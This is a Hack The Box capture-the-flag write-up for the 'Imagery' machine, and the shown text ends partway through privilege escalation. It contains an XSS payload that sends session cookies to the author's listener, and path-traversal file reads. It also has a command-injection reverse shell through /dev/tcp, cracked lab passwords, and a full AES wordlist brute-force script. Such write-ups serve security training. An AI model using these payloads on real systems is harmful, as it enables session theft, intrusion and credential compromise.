---
layout: post
title: "[HTB] Imagery"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---

![](/img/htb_img/Imagery_img/img1.png)

- OS: Linux
- Release Date: 27 Sep 2025
- Difficulty: Medium

<br>

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --open -sS -n -Pn -vvv -oG allports $target 2>/dev/null
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 18:44 CEST
Initiating SYN Stealth Scan at 18:44
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.129.xx.xx
Discovered open port 8000/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 18:45, 14.85s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.033s latency).
Scanned at 2025-09-29 18:44:59 CEST for 15s
Not shown: 65060 closed tcp ports (reset), 473 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds
           Raw packets sent: 66402 (2.922MB) | Rcvd: 65062 (2.602MB)
```

Scripts and versions.
```
❯ extractPorts allports
───────┬───────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.129.xx.xx
   5   │     [*] Open ports: 22,8000
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴───────────────────────────────────────────────────────────────────────────

❯ nmap -p22,8000 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 18:45 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
```

## TCP 8000 - HTTP Web
![](/img/htb_img/Imagery_img/img2.png)

### Web fuzzing
```
❯ feroxbuster -u http://imagery.htb:8000/ -w /usr/share/wordlists/dirb/common.txt

                                                                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://imagery.htb:8000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://imagery.htb:8000/upload_image
200      GET       27l       48w      584c http://imagery.htb:8000/static/fonts.css
200      GET        3l      282w    20343c http://imagery.htb:8000/static/purify.min.js
200      GET       83l     9103w   407279c http://imagery.htb:8000/static/tailwind.js
200      GET     2779l     9472w   146960c http://imagery.htb:8000/
401      GET        1l        4w       59c http://imagery.htb:8000/images
405      GET        5l       20w      153c http://imagery.htb:8000/login
405      GET        5l       20w      153c http://imagery.htb:8000/logout
405      GET        5l       20w      153c http://imagery.htb:8000/register
[####################] - 9s      4628/4628    0s      found:9       errors:0      
[####################] - 9s      4614/4614    513/s   http://imagery.htb:8000/
```

Nothing interesting stands out.

### Registering new user

![](/img/htb_img/Imagery_img/img3.png)

![](/img/htb_img/Imagery_img/img4.png)

### Uploading images
We are able to upload images but we can't transform them.
![](/img/htb_img/Imagery_img/img5.png)

## Session Cookies stealing
![](/img/htb_img/Imagery_img/img8.png)
Browsing around the webpage, we find a `Report a bug` option and we can try to inject an XSS payload, setting up a Python server and intercepting with Burp Suite.
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [29/Sep/2025 19:01:15] code 404, message File not found
10.129.xx.xx - - [29/Sep/2025 19:01:15] "GET /yoink/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNq7VQ.hdOsYkpz87iLXgquYfoRmmSzwsg HTTP/1.1" 404 -
10.129.xx.xx - - [29/Sep/2025 19:01:16] code 404, message File not found
10.129.xx.xx - - [29/Sep/2025 19:01:16] "GET /favicon.ico HTTP/1.1" 404 -

```

```
# Payload
<img src=1 onerror="document.location='http://10.10.xx.xx/yoink/'+ document.cookie"> </img>
```

![](/img/htb_img/Imagery_img/img6.png)

So, we put this stolen value into our cookie storage, reload the page and we have an admin panel.
![](/img/htb_img/Imagery_img/img7.png)

## Admin web panel
![](/img/htb_img/Imagery_img/img9.png)
Now we have access to an admin panel and we can download a log for the admin user.
The log file doesn't have anything special.
```
❯ cat admin@imagery.htb.log

       │ File: admin@imagery.htb.log

   1   │ [2025-10-02T16:00:08.963615] Logged in successfully.
   2   │ [2025-10-02T16:00:08.968997] Logged in successfully.
   3   │ [2025-10-02T16:01:08.564579] Logged in successfully.
   4   │ [2025-10-02T16:01:08.569973] Logged in successfully.
   5   │ [2025-10-02T16:02:08.190781] Logged in successfully.
   6   │ [2025-10-02T16:02:08.192278] Logged in successfully.
   7   │ [2025-10-02T16:03:08.745015] Logged in successfully.
   8   │ [2025-10-02T16:03:08.750114] Logged in successfully.
   9   │ [2025-10-02T16:04:08.576233] Logged in successfully.
  10   │ [2025-10-02T16:04:08.577633] Logged in successfully.
  11   │ [2025-10-02T16:05:08.338013] Logged in successfully.
  12   │ [2025-10-02T16:05:08.340643] Logged in successfully.
```


# Foothold
## Local File Inclusion
We catch this request with Burpsuite to see if there is something interesting there.
![](/img/htb_img/Imagery_img/img10.png)

As we can see, there is a parameter called `log_identifier` that points to a local file. This may lead to a `Local File Inclusion` vulnerability, where we can read arbitrary local files through this response.

It seems that it isn't even necessary to URL-encode the path traversal:
![](/img/htb_img/Imagery_img/img11.png)

And it works, we have a LFI working right here.

## Obtaining credentials
After wandering for a bit, I noticed that `/etc/passwd` contains a user named `web`. The application is Python/Werkzeug, which typically has a `config.py`, so I searched for it and found a match:
```


import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'

```
The important part is in one of the first lines: `DATA_STORE_PATH = 'db.json'`.
Searching for this file we obtain some credentials:

```
../../../../../home/web/web/db.json
```
![](/img/htb_img/Imagery_img/img12.png)

```


{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ]
```

We try these passwords on Crackstation:
![](/img/htb_img/Imagery_img/img13.png)

The `testuser` has the password `iambatman`.
![](/img/htb_img/Imagery_img/img14.png)
This account can transform and convert images.
Let's try: Transform → CROP → catch with Burp Suite.
```
POST /apply_visual_transform HTTP/1.1

Host: imagery.htb:8000

Content-Length: 121

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

Content-Type: application/json

Accept: */*

Origin: http://imagery.htb:8000

Referer: http://imagery.htb:8000/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN6njQ.5OcTfcTW3nU8xuGidR5lKPPNp80

Connection: keep-alive



{"imageId":"4141fd87-db9a-4c44-8d2d-6cacd45cef47","transformType":"crop","params":{"x":0,"y":0,"width":976,"height":850}}
```

## Shell as web
We can try to inject a reverse shell into parameter `x`.
```
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
Content-Length: 121
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://imagery.htb:8000
Referer: http://imagery.htb:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN6njQ.5OcTfcTW3nU8xuGidR5lKPPNp80

Connection: keep-alive


{"imageId":"4141fd87-db9a-4c44-8d2d-6cacd45cef47",
"transformType":"crop",
"params":{
	"x":";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/10.10.xd.xd/4444 0>&1\";",
	"y":0,
	"width":976,
	"height":850}}
```

And we got a shell.
```
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from Imagery~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /home/web/web/env/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/Imagery~10.129.xx.xx-Linux-x86_64/2025_10_02-18_33_35-386.log 📜
────────────────────────────────────────────────────────────────────────────
web@Imagery:~/web$ 
```


# Lateral Movement
As `web`, let's run the typical `linpeas.sh`.
![](/img/htb_img/Imagery_img/img15.png)

We find an interesting file:
```
web@Imagery:/var/backup$ ls -lh
total 22M
-rw-rw-r-- 1 root root 22M Aug  6  2024 web_20250806_120723.zip.aes
```

We download it to our machine to take a look.
Using ChatGPT, we write a script that uses pyAesCrypt to brute-force this encrypted file.
```
❯ python3 -m venv venv
❯ source venv/bin/activate
❯ pip install pyAesCrypt
```

Script:
```
#!/usr/bin/env python3
"""
brute.py

Range-based brute-force for pyAesCrypt (AES Crypt v2 .aes files).
Design:
 - Split the wordlist file by byte ranges (N workers). Each worker scans its range.
 - One-time decompression if wordlist is gzipped.
 - Checkpoint file (JSON) to mark completed ranges so you can resume.
 - Shared Event signals workers to stop when a password is found.
 - Uses multiprocessing.Process (no heavy IPC).
 - Intended for CTF/lab use only (authorized files).

Usage:
    python3 brute.py wordlist.txt[.gz] file.aes [-j 6] [-o secret.zip] [--checkpoint cp.json] [--quiet]

Example:
    python3 brute.py /usr/share/wordlists/rockyou.txt.gz secret.zip.aes -j 6
"""
from __future__ import annotations
import argparse
import gzip
import json
import multiprocessing as mp
import os
import sys
import tempfile
import time
from typing import List, Tuple, Optional
from os.path import isfile, getsize
import pyAesCrypt

BUFFER_SIZE = 64 * 1024
DEFAULT_CHECKPOINT_SUFFIX = ".brute_checkpoint.json"
DECOMP_SUFFIX = ".brute_wl.txt"


def ensure_plain_wordlist(path: str) -> Tuple[str, bool]:
    """If path endswith .gz, decompress to temporary file and return (tmp_path, True).
    If plain, return (path, False). Caller must not delete plain files; temporary
    files (when returned second value True) will be cleaned by the script on exit.
    """
    if path.endswith(".gz"):
        fd, tmpname = tempfile.mkstemp(suffix=DECOMP_SUFFIX, prefix="brute_")
        os.close(fd)
        with gzip.open(path, "rb") as fin, open(tmpname, "wb") as fout:
            while True:
                data = fin.read(1 << 20)
                if not data:
                    break
                fout.write(data)
        return tmpname, True
    return path, False


def compute_ranges(file_path: str, workers: int) -> List[Tuple[int, int]]:
    """Divide file_length into workers ranges [start, end) in bytes."""
    size = getsize(file_path)
    if size == 0:
        return []
    base = size // workers
    ranges = []
    for i in range(workers):
        start = i * base
        end = (i + 1) * base if i < workers - 1 else size
        ranges.append((start, end))
    return ranges


def align_forward_to_line(fh, pos: int) -> int:
    """Seek to pos, then read the remainder of the current line so position is at next line start.
    Returns adjusted position (>= pos). If pos == 0 returns 0.
    """
    if pos <= 0:
        return 0
    fh.seek(pos)
    fh.readline()  # consume partial line
    return fh.tell()


def align_backward_to_line(fh, pos: int) -> int:
    """Return the start position of the line that contains byte pos (i.e., go back to previous newline+1).
    If none found, return 0. Used to set a safe start when required.
    """
    if pos <= 0:
        return 0
    # read backwards in blocks
    step = 4096
    cur = pos
    while cur > 0:
        start = max(0, cur - step)
        fh.seek(start)
        data = fh.read(cur - start)
        idx = data.rfind(b"\n")
        if idx != -1:
            return start + idx + 1
        cur = start
    return 0


def worker_scan(infile: str, wl_path: str, start: int, end: int,
                stop_event: mp.Event, result_queue: mp.Queue, outname: str,
                quiet: bool):
    """Worker: scans wl_path from adjusted start to end. If pw found, put dict into result_queue."""
    try:
        with open(wl_path, "rb") as fh:
            real_start = align_forward_to_line(fh, start)
            fh.seek(real_start)
            last_report = time.time()
            while fh.tell() < end and not stop_event.is_set():
                raw = fh.readline()
                if not raw:
                    break
                pwb = raw.rstrip(b"\r\n")
                if not pwb:
                    continue
                try:
                    pw = pwb.decode("utf-8")
                except Exception:
                    pw = pwb.decode("latin-1", "ignore")
                # attempt decrypt
                fd, tmpname = tempfile.mkstemp(prefix="brute_out_", suffix=".tmp")
                os.close(fd)
                try:
                    pyAesCrypt.decryptFile(infile, tmpname, pw, BUFFER_SIZE)
                    # success
                    # try to move file to final name; if fails, leave tmp for inspection
                    try:
                        os.replace(tmpname, outname)
                        tmp_left = None
                    except Exception:
                        tmp_left = tmpname
                    result_queue.put({
                        "status": "FOUND",
                        "lineno_offset": fh.tell(),
                        "password": pw,
                        "tmpfile": tmp_left
                    })
                    stop_event.set()
                    return
                except ValueError:
                    # wrong password
                    try:
                        os.remove(tmpname)
                    except Exception:
                        pass
                except IOError as e:
                    try:
                        os.remove(tmpname)
                    except Exception:
                        pass
                    result_queue.put({"status": "IOERR", "message": str(e)})
                    stop_event.set()
                    return
                except Exception as e:
                    try:
                        os.remove(tmpname)
                    except Exception:
                        pass
                    result_queue.put({"status": "ERR", "message": str(e)})
                    stop_event.set()
                    return

                # occasional progress report to stdout
                if not quiet and (time.time() - last_report) >= 5:
                    print(f"[pid {os.getpid()}] offset {fh.tell():,} / {end:,}")
                    last_report = time.time()
    except Exception as exc:
        result_queue.put({"status": "ERR", "message": f"worker exception: {exc!s}"})


def save_checkpoint(cp_path: str, completed_ranges: List[int]):
    try:
        with open(cp_path, "w") as fh:
            json.dump({"completed_ranges": completed_ranges, "timestamp": time.time()}, fh)
    except Exception:
        pass


def load_checkpoint(cp_path: str) -> Optional[dict]:
    if not os.path.exists(cp_path):
        return None
    try:
        with open(cp_path, "r") as fh:
            return json.load(fh)
    except Exception:
        return None


def parse_args():
    p = argparse.ArgumentParser(description="Range-based pyAesCrypt brute force (wordlist ranges).")
    p.add_argument("wordlist", help="Path to wordlist (plain or .gz)")
    p.add_argument("infile", help="Encrypted .aes file to crack")
    p.add_argument("-j", "--jobs", type=int, default=max(1, mp.cpu_count() - 1),
                   help="Number of worker processes (default: CPU-1)")
    p.add_argument("-o", "--out", default=None,
                   help="Output filename (default infile without .aes)")
    p.add_argument("--checkpoint", default=None,
                   help="Checkpoint JSON path (default: infile + '{}')".format(DEFAULT_CHECKPOINT_SUFFIX))
    p.add_argument("--quiet", action="store_true", help="Minimal output")
    return p.parse_args()


def main():
    args = parse_args()

    if not isfile(args.wordlist):
        print("Wordlist not found:", args.wordlist, file=sys.stderr)
        sys.exit(1)
    if not isfile(args.infile):
        print("Input file not found:", args.infile, file=sys.stderr)
        sys.exit(1)

    if args.out:
        outname = args.out
    elif args.infile.endswith(".aes"):
        outname = args.infile[:-4]
    else:
        print('Provide -o when input file does not end with ".aes"', file=sys.stderr)
        sys.exit(1)

    checkpoint_path = args.checkpoint or (args.infile + DEFAULT_CHECKPOINT_SUFFIX)

    wl_plain_path = None
    decompressed_temp = False
    try:
        wl_plain_path, decompressed_temp = ensure_plain_wordlist(args.wordlist)
        ranges = compute_ranges(wl_plain_path, args.jobs)
        if not ranges:
            print("Wordlist empty or unreadable.", file=sys.stderr)
            sys.exit(1)

        # load checkpoint to skip finished ranges (store indices of completed ranges)
        cp = load_checkpoint(checkpoint_path)
        completed = set(cp.get("completed_ranges", [])) if cp else set()
        if not args.quiet:
            print(f"Wordlist (plain) = {wl_plain_path} (decompressed={decompressed_temp})")
            print(f"Infile = {args.infile} -> out = {outname}")
            print(f"Workers = {args.jobs}, ranges = {len(ranges)}, checkpoint = {checkpoint_path}")
            if completed:
                print(f"Resuming, skipping completed ranges: {sorted(completed)}")

        manager = mp.Manager()
        stop_event = manager.Event()
        result_q = manager.Queue()

        processes: List[mp.Process] = []
        completed_ranges: List[int] = sorted(list(completed))

        try:
            for idx, (start, end) in enumerate(ranges):
                if idx in completed:
                    # skip this whole range
                    if not args.quiet:
                        print(f"[skip] range #{idx} {start}-{end}")
                    continue
                p = mp.Process(target=worker_scan,
                               args=(args.infile, wl_plain_path, start, end, stop_event, result_q, outname, args.quiet))
                p.start()
                processes.append((idx, p))

            # monitor results
            found_info = None
            try:
                while True:
                    # check result queue
                    try:
                        res = result_q.get(timeout=1)
                        if not args.quiet:
                            print("Result queue:", res)
                    except Exception:
                        res = None

                    if res:
                        status = res.get("status")
                        if status == "FOUND":
                            found_info = res
                            break
                        elif status in ("IOERR", "ERR"):
                            print("Worker error:", res.get("message"), file=sys.stderr)
                            # stop all workers and exit with error
                            stop_event.set()
                            break

                    # check if all started processes finished naturally
                    alive = [p for (_, p) in processes if p.is_alive()]
                    if not alive:
                        # all workers done
                        break

                    # if stop_event set by some worker, break
                    if stop_event.is_set():
                        break

                # join processes and collect which ranges completed
                for idx, p in processes:
                    p.join(timeout=0.1)
                    if not p.is_alive():
                        completed_ranges.append(idx)
                completed_ranges = sorted(set(completed_ranges))
                save_checkpoint(checkpoint_path, completed_ranges)

            except KeyboardInterrupt:
                print("\nInterrupted by user. Stopping workers...", file=sys.stderr)
                stop_event.set()
            finally:
                # ensure all processes are terminated
                for idx, p in processes:
                    if p.is_alive():
                        p.terminate()
                        p.join()

            # handle result
            if found_info:
                print("\n*** PASSWORD FOUND ***")
                print("Password:", found_info.get("password"))
                tmp = found_info.get("tmpfile")
                if tmp:
                    print("Decrypted temp file left at:", tmp)
                else:
                    print("Decrypted file written to:", outname)
                # mark all ranges as completed in checkpoint
                save_checkpoint(checkpoint_path, list(range(len(ranges))))
                sys.exit(0)
            else:
                if stop_event.is_set():
                    print("Stopped due to error or external signal.", file=sys.stderr)
                    sys.exit(1)
                else:
                    print("Finished all ranges — no password found in the provided wordlist.")
                    sys.exit(2)

        finally:
            manager.shutdown()

    finally:
        # cleanup temporary decompressed wordlist if any
        if decompressed_temp and wl_plain_path and os.path.exists(wl_plain_path):
            try:
                os.remove(wl_plain_path)
            except Exception:
                pass


if __name__ == "__main__":
    main()

```

## Breaking AES
Executing the script:
```
❯ python3 brute.py /usr/share/wordlists/rockyou.txt web_20250806_120723.zip.aes
Wordlist (plain) = /usr/share/wordlists/rockyou.txt (decompressed=False)
Infile = web_20250806_120723.zip.aes -> out = web_20250806_120723.zip
Workers = 5, ranges = 5, checkpoint = web_20250806_120723.zip.aes.brute_checkpoint.json
[pid 5990] offset 1,450 / 27,984,301
[pid 5991] offset 27,986,263 / 55,968,602
[pid 5992] offset 55,970,460 / 83,952,903
[pid 5994] offset 111,938,984 / 139,921,507
[pid 5993] offset 83,954,654 / 111,937,204
[pid 5991] offset 27,987,950 / 55,968,602
[pid 5990] offset 2,922 / 27,984,301
[pid 5992] offset 55,972,320 / 83,952,903
[pid 5993] offset 83,956,505 / 111,937,204
[pid 5994] offset 111,940,929 / 139,921,507
[pid 5992] offset 55,973,986 / 83,952,903
[pid 5990] offset 4,266 / 27,984,301
[pid 5991] offset 27,989,569 / 55,968,602
[pid 5993] offset 83,958,201 / 111,937,204
[pid 5994] offset 111,942,518 / 139,921,507
Result queue: {'status': 'FOUND', 'lineno_offset': 5220, 'password': 'bestfriends', 'tmpfile': '/tmp/brute_out_b5ag6o98.tmp'}

*** PASSWORD FOUND ***
Password: bestfriends
Decrypted temp file left at: /tmp/brute_out_b5ag6o98.tmp
```

```
❯ pyAesCrypt -d web_20250806_120723.zip.aes
Password: bestfriends
```

## Inspecting the extracted folder
It contains a .zip of the web app.
```
❯ cd web
❯ ll
drwxrwxr-x kali kali 4.0 KB Thu Oct  2 19:01:53 2025  __pycache__
drwxrwxr-x kali kali 4.0 KB Thu Oct  2 19:01:54 2025  env
drwxrwxr-x kali kali 4.0 KB Thu Oct  2 19:01:53 2025  system_logs
drwxrwxr-x kali kali 4.0 KB Thu Oct  2 19:01:53 2025  templates
.rw-rw-r-- kali kali 9.6 KB Tue Aug  5 08:56:42 2025  api_admin.py
.rw-rw-r-- kali kali 6.2 KB Tue Aug  5 08:56:54 2025  api_auth.py
.rw-rw-r-- kali kali  12 KB Tue Aug  5 08:57:06 2025  api_edit.py
.rw-rw-r-- kali kali 8.9 KB Tue Aug  5 08:57:20 2025  api_manage.py
.rw-rw-r-- kali kali 840 B  Tue Aug  5 08:58:18 2025  api_misc.py
.rw-rw-r-- kali kali  12 KB Tue Aug  5 08:58:38 2025  api_upload.py
.rw-rw-r-- kali kali 1.9 KB Tue Aug  5 15:21:24 2025  app.py
.rw-rw-r-- kali kali 1.8 KB Tue Aug  5 08:59:48 2025  config.py
.rw-rw-r-- kali kali 1.5 KB Wed Aug  6 12:07:02 2025  db.json
.rw-rw-r-- kali kali 3.9 KB Tue Aug  5 09:00:20 2025  utils.py
```

We can inspect the `db.json`, the same file we saw earlier, but now it has different data.
```
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

We have a new hash for `Mark`: 01c3d2e5bdaf6134cec0a367cf53e535
![](/img/htb_img/Imagery_img/img16.png)

Password: `supersmash`.

## User mark
```
web@Imagery:/home$ su mark
Password: supersmash
mark@Imagery:/home$ cd
mark@Imagery:~$ 
```

### User flag
```
mark@Imagery:~$ cat user.txt
<REDACTED>
mark@Imagery:~$ 
```
---

# Privilege Escalation
```
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```
We have sudo permission to run `charcol`.

## Charcol binary
```
mark@Imagery:~$ sudo /usr/local/bin/charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0


Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help


mark@Imagery:~$ sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-10-02 17:07:42] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 
<...>
[2025-10-02 17:07:45] [ERROR] KeyboardInterrupt


mark@Imagery:~$ sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
mark@Imagery:~$
```
As we can see, we need a master passphrase to unlock the stored passwords. In this case, it's not `supersmash`. On the help menu we can see that we can reset the password to default.

### Password reset
```
mark@Imagery:~$ sudo /usr/local/bin/charcol -R

Attempting to reset Charcol application password to default.
[2025-10-02 17:09:29] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-02 17:09:31] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
mark@Imagery:~$ 
```

```
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
